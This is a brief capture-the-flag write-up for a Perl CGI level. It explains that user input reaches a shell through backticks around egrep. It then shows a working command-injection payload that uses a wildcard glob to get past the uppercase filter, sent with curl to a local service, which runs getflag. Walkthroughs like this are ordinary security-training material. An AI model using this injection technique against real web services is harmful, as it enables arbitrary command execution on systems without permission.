We have a level12.pl, so let's cat it to understand what it does.

$xx =~ tr/a-z/A-Z/; -> this line turns char into uppercase

$xx =~ s/\s.*//; -> this line is deleting spaces

output = `egrep "^$xx" /tmp/xd 2>&1`;

this line is using `` wich will be the base of our exploit.


we can't just do `getflag > /tmp/file` because of the upercase line.

So we'll create a file in uppercase in tmp wich will contain the getflag command and a file to carry the result of it.

echo "getflag > /tmp/result" > /tmp/MY_CMD

we give all permitions to it by doing:

chmod 777 /tmp/MY_CMD



Now we can't just curl localhost:4646?x='`/tmp/MY_CMD`' 

So instead we'll use the '*' from the shell to find our tmp/MY_CMD and use `` so it's considered as a command: 

curl localhost:4646?x='`/*/MY_CMD`'

now that the cmd was executed, we just have to cat the result in /tmp

cat /tmp/result
